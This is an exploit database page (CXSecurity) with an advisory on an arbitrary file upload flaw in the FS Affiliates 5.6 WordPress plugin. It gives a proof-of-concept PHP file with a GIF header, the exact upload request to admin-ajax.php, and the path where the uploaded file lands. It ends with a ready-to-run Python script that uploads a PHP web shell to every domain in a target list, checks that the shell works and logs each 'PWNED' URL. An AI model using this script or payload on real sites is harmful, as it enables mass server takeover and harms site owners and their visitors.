---
title: WordPress Plugin FS Affiliates 5.6 - Unrestricted Arbitrary File Upload
url: https://cxsecurity.com/issue/WLB-2026010015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-01-25
fetch_date: 2026-01-26T03:52:14.266201
---

# WordPress Plugin FS Affiliates 5.6 - Unrestricted Arbitrary File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress Plugin FS Affiliates 5.6 - Unrestricted Arbitrary File Upload**  **2026.01.25**  Credit:  **[UnM@SK](https://cxsecurity.com/author/UnM%40SK/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-434](https://cxsecurity.com/cwe/CWE-434 "Click to see CWE-434")** | |

####### [UnM@SK Security Advisory] #######
[#] Title: WordPress Plugin FS Affiliates 5.6 - Unrestricted Arbitrary File Upload
[#] Author: UnM@SK
[#] Date: 2026-01-23
[#] Plugin Name: FS Affiliates (folder: affs)
[#] Plugin Version: 5.6 (and possibly below)
[#] Vulnerability Type: Arbitrary File Upload / Remote Code Execution (RCE)
[#] Tested on: WordPress 6.x
--- [ DESCRIPTION ] ---
The plugin FS Affiliates for WordPress fails to properly validate file types and permissions in its AJAX file upload handler. An attacker can upload a malicious PHP script disguised with image magic bytes, leading to full server compromise (RCE).
--- [ PROOF OF CONCEPT ] ---
1. Prepare a file named "uploader.php" with the following content:
GIF89a
<?php echo "Pwned by UnM@SK"; phpinfo(); ?>
2. Send the following POST request:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: [TARGET]
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXMP3iUnCATDwy4ls
------WebKitFormBoundaryXMP3iUnCATDwy4ls
Content-Disposition: form-data; name="action"
fs\_affiliates\_file\_upload
------WebKitFormBoundaryXMP3iUnCATDwy4ls
Content-Disposition: form-data; name="key"
fs\_affiliates\_file\_upload\_76
------WebKitFormBoundaryXMP3iUnCATDwy4ls
Content-Disposition: form-data; name="fs\_affiliates\_file\_upload\_76"; filename="uploader.php"
Content-Type: image/jpeg
[PAYLOAD\_HERE]
------WebKitFormBoundaryXMP3iUnCATDwy4ls--
--- [ SHELL ACCESS ] ---
Successfully uploaded files can be accessed at:
http://[TARGET]/wp-content/uploads/fs-files/uploader.php
--- [ GREETZ ] ---
IdiotCrew - L4663R666H05T
#auto Exploit Input site list.txt no http/https in list and start python3 up.py
import requests
import urllib3
# Mematikan peringatan SSL
urllib3.disable\_warnings(urllib3.exceptions.InsecureRequestWarning)
# --- KONFIGURASI ---
TARGETS\_FILE = 'list.txt'
OUTPUT\_FILE = 'output.txt'
FILENAME = 'uploader.php'
# PHP Uploader Payload (dengan Header GIF89a untuk Bypass)
SHELL\_PAYLOAD = '''GIF89a
<?php
echo "<b>[ Uploader Shell Loaded ]</b><br><br>";
if(isset($\_FILES['file'])){
if(move\_uploaded\_file($\_FILES['file']['tmp\_name'], $\_FILES['file']['name'])){
echo "<font color='green'>Upload Success:</font> ".$\_FILES['file']['name'];
} else {
echo "<font color='red'>Upload Failed!</font>";
}
}
?>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="file">
<input type="submit" value="Upload Now">
</form>
'''
def pwn(domain):
domain = domain.strip().replace('http://', '').replace('https://', '').rstrip('/')
if not domain: return
# Coba kedua protokol
for proto in ['https://', 'http://']:
base\_url = f"{proto}{domain}"
ajax\_url = f"{base\_url}/wp-admin/admin-ajax.php"
shell\_url = f"{base\_url}/wp-content/uploads/fs-files/{FILENAME}"
print(f"[\*] Targeting: {base\_url}")
data = {
'action': 'fs\_affiliates\_file\_upload',
'key': 'fs\_affiliates\_file\_upload\_76'
}
files = {
'fs\_affiliates\_file\_upload\_76': (FILENAME, SHELL\_PAYLOAD, 'image/jpeg')
}
try:
# Kirim Shell
requests.post(ajax\_url, data=data, files=files, timeout=12, verify=False)
# Verifikasi Shell
check = requests.get(shell\_url, timeout=12, verify=False)
if check.status\_code == 200 and "Uploader Shell Loaded" in check.text:
result = f"[+] PWNED: {shell\_url}"
print(result)
with open(OUTPUT\_FILE, 'a') as f:
f.write(result + '\n')
return # Stop jika sudah sukses di domain ini
else:
print(f" [-] Shell not found on {proto}")
except:
continue
def main():
try:
with open(TARGETS\_FILE, 'r') as f:
targets = [line.strip() for line in f if line.strip()]
print(f"[\*] Running exploit on {len(targets)} targets...")
for target in targets:
pwn(target)
print(f"\n[\*] Finished. Results saved in {OUTPUT\_FILE}")
except FileNotFoundError:
print(f"Error: {TARGETS\_FILE} not found!")
if \_\_name\_\_ == "\_\_main\_\_":
main()
##########################################

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026010015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top